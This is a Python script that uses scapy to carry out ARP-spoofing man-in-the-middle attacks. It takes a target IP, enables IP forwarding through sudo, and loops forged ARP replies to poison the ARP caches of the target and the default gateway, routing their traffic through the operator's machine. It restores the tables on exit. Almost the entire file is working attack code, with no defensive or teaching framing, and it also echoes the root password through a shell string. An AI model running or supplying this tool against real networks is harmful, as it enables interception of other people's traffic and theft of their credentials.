import scapy.all as scapy
import os, netifaces
import getpass, subprocess
from time import sleep

"""Need to convert to work in windows"""
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def stop_forwarding_linux():
    ip_forward = "echo 0 > /proc/sys/net/ipv4/ip_forward"
    subprocess.call('echo {} | sudo -S {}'.format(root_password, ip_forward), shell=True)
    print(bcolors.FAIL + "\nIp forwarding halted" + bcolors.ENDC + "\n")


def start_forwarding_linux():
    ip_forward = "echo 1 > /proc/sys/net/ipv4/ip_forward"
    
    print("\n" + bcolors.OKGREEN + "Forwarding Ip" + bcolors.ENDC)
    subprocess.call('echo {} | sudo -S {}'.format(root_password, ip_forward), shell=True)


def get_default_gateway_linux():
    if os.name == 'posix':
        print(bcolors.OKBLUE + "[+] Linux Detected grabbing default gateway" + bcolors.ENDC)
        gateways = netifaces.gateways()
        default_gateway = gateways['default'][netifaces.AF_INET][0]
        print(bcolors.OKBLUE + "Default Gateway is \n> " + default_gateway + bcolors.ENDC)
    return default_gateway


def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore_arp(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc




sent_packets_count = 0
root_password = getpass.getpass("Enter Sudo password : ")
target_ip = input("Enter the target ip\n>")
gateways = netifaces.gateways()
default_gateway = gateways['default'][netifaces.AF_INET][0]




try:
    
    start_forwarding_linux()
    
    while True:
        arp_spoof(target_ip, default_gateway)
        arp_spoof(default_gateway, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Sent Packets : " + str(sent_packets_count),end="")
        sleep(2)

except KeyboardInterrupt:
    
    stop_forwarding_linux()
    
    print(bcolors.FAIL + "Detected CTRL + C\nExiting" + bcolors.ENDC)
    print("Restoring ARP tables")
    
    restore_arp(target_ip, default_gateway)
    restore_arp(default_gateway, target_ip)
    for i in range(0,11):
        sleep(1)
        print("\r waiting for 10 seconds : " + str(i),end="")
    subprocess.call("clear")
